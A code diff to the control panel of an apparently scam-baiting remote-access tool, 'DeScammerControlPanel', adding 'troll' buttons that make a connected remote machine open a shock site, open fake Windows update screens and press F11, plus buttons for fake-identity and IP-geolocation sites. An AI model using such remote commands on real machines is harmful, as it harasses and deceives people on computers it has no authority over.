@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Threading;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -129,6 +130,69 @@ namespace DeScammerControlPanel
         {
             if(!CommandManager.IsLoaded)
                 CommandManager.Load(); // Load the command manager
+        }
+
+        private void Main_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            if (Variables.Client == null || !Variables.Client.IsConnected)
+                return; // Client isn't connected don't bother
+
+            RemoveClient();
+        }
+        #endregion
+
+        #region Troll Buttons - Websites
+        private void btnWLeekspin_Click(object sender, EventArgs e)
+        {
+            Variables.Client.Send(CommandManager.FormatCommand("processstart", new string[] { "http://leekspin.com/" }));
+        }
+
+        private void btnWWin7Update_Click(object sender, EventArgs e)
+        {
+            Variables.Client.Send(CommandManager.FormatCommand("foregroundapp", new string[] { "chrome" }));
+            Variables.Client.Send(CommandManager.FormatCommand("processstart", new string[] { "http://fakeupdate.net/win7/index.html" }));
+            Variables.Client.Send(CommandManager.FormatCommand("sendkey", new string[] { "{F11}" }));
+        }
+
+        private void btnWWinXPUpdate_Click(object sender, EventArgs e)
+        {
+            Variables.Client.Send(CommandManager.FormatCommand("foregroundapp", new string[] { "chrome" }));
+            Variables.Client.Send(CommandManager.FormatCommand("processstart", new string[] { "http://fakeupdate.net/xp/index.html" }));
+            Variables.Client.Send(CommandManager.FormatCommand("sendkey", new string[] { "{F11}" }));
+        }
+
+        private void btnWWin10Update_Click(object sender, EventArgs e)
+        {
+            Variables.Client.Send(CommandManager.FormatCommand("foregroundapp", new string[] { "chrome" }));
+            Variables.Client.Send(CommandManager.FormatCommand("processstart", new string[] { "http://fakeupdate.net/win10/index.html" }));
+            Variables.Client.Send(CommandManager.FormatCommand("sendkey", new string[] { "{F11}" }));
+        }
+
+        private void btnWMeatspin_Click(object sender, EventArgs e)
+        {
+            Variables.Client.Send(CommandManager.FormatCommand("processstart", new string[] { "http://meatspin.fr/" }));
+        }
+        #endregion
+
+        #region Troll Buttons - Utilities
+        private void btnUFakeName_Click(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process.Start("http://www.fakenamegenerator.com/");
+        }
+
+        private void btnUFakeMail_Click(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process.Start("http://www.fakemailgenerator.com/");
+        }
+
+        private void btnUIPLookup_Click(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process.Start("http://ip-lookup.net/");
+        }
+
+        private void btnUGeolocation_Click(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process.Start("http://www.infosniper.net/");
         }
         #endregion
     }
